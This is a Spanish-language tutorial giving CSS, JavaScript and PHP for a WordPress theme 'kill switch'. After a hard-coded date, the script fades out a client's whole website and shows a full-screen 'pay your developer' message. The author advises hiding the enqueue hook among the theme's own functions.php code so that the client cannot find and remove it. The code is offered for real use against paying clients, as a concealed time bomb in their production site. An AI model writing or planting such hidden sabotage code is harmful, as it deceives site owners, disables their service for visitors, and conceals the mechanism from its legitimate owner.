# Codigo especial para poner a raya a aquellos clientes que son mala pagas
**Nuestro esfuerzo como desarroladores vale y nuestro tiempo tambien**

### El archivo CSS
Normalmente en las rutas propias de Wordpress en la carpetas theme siempre debe estar alojado un archivo **css** que es llamado globalmente, la ruta deberia ser:

` wp-content --> themes --> nombre_del_tema --> style.css `
#
el codigo es el siguiente: 

```
    .client-mensaje{
        background: red;
        color: #fff;
        font-family: Poppins;
        font-weight: Bold;
        font-size: 8vw;
        display: none;
        position: fixed;
        width: 100%;
        height: 100%;
        top: 0;
        left: 0;
        padding: 5%;
    }
    .client-mensaje p{
        height: 100%;
        display: flex;
        align-items: center;
        justify-content: center;
        text-align: center;
        line-height: 1.3;
    }

```

### El archivo JS
Este archivo directamente escribe dentro etiquetas HTML para que directamente sean insertadas en el **DOM** normalmente en las rutas propias de Wordpress en la carpetas theme siempre debe estar alojado un una carpeta **js** y dentro de ella un archivo **js** que es llamado globalmente, la ruta deberia ser:

` wp-content --> themes --> nombre_del_tema --> includes --> settings-functions.js `
#
el codigo es el siguiente: 


```
(function($){
    
//Desvanece la web con la funcion Date YY-MM-DD
    var sentencia_date = new Date('2022-02-30'),
    
        current_date = new Date(),
        utc1 = Date.UTC(sentencia_date.getFullYear(), sentencia_date.getMonth(), sentencia_date.getDate()),
        utc2 = Date.UTC(current_date.getFullYear(), current_date.getMonth(), current_date.getDate()),
        days = Math.floor((utc1 - utc2) / (1000 * 60 * 60 * 24))
          
  
  if(days <= 0) {
    
      $('body > *').fadeOut(5000)
        setTimeout( function(){
          $('body').append( $('.client-mensaje') )
          $('.client-mensaje').fadeIn()
      }, 5000 )
      
      alert("Lenin Mendoza te envia a decir que...");
      document.write("<div class='client-mensaje'>");
      document.write("<p>");
      document.write("Que pena pero por favor... <br/>Pagale a tu Desarrollador!");
      document.write("</p>");
      document.write("<\/div>");
  }
  

  
}(jQuery))



```

## No hemos terminado falata el script PHP que sera resgistrado en **Wordpress**

Este archivo de por si y con las mejores practicas debe ser insertado en el **function.php** de tu tema de **WP**.
#
el codigo es el siguiente:


```

function wp_core(){
    
    wp_register_script('script', get_template_directory_uri(). '/includes/settings-functions.js', array('jquery'), '1', true );
    wp_enqueue_script('script');
    
}

add_action("wp_enqueue_scripts", "wp_core");


```
Estrategicamente podriamos pensar meter todo este codigo en un plugins o complemento y de este modo ocultar a la vista de todos este complemento pero el que conozca **WP** sabra meterse en el server y navegar por las carpetas del **WP** y eliminar el complemento. a mi pensar es mejor mezclar la funcion creada para implementar en el **function.php** con funciones propias del tema...
## Ojo! Este ultimo comentario solo para usuarios experimentados... Un abrazo 
#
### Atte. Lenin Mendoza...
